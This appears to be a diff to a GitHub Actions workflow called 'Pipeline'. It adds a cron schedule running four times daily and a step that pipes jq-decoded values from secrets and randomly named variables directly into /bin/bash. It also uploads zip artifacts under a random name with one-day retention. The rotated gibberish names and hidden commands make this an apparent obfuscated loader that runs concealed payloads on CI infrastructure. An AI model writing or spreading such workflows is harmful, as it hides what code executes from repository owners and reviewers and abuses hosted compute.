@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '49 4,10,16,22 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,19 +24,19 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          c72: ${{ secrets.c72 }}
+          rzvc06: ${{ secrets.rzvc06 }}
         run: |
-          printf '%s' "$c72" | jq -r .kt1 | /bin/bash
-          echo $t678 | jq -r .drt2 | /bin/bash
-          echo $zil115 | jq -r .vp5401 | /bin/bash
-          printf '%s' "$karq074" | jq -r .fch3931 | /bin/bash
-          echo $dcpc1053 | jq -r .pmune55 | /bin/bash
-          echo $vjrjo9795 | jq -r .q70792 | /bin/bash
+          printf '%s' "$rzvc06" | jq -r .s9041 | /bin/bash
+          echo $lubul8884 | jq -r .bw399 | /bin/bash
+          printf '%s' "$jxfqb6101" | jq -r .t5 | /bin/bash
+          printf '%s' "$xfocu1894" | jq -r .o1 | /bin/bash
+          printf '%s' "$kbk7" | jq -r .bpux66929 | /bin/bash
+          echo $f64 | jq -r .vxz10168 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: viEVx8j9
+          name: FeKUNJYg
           path: "*.zip"
           retention-days: 1
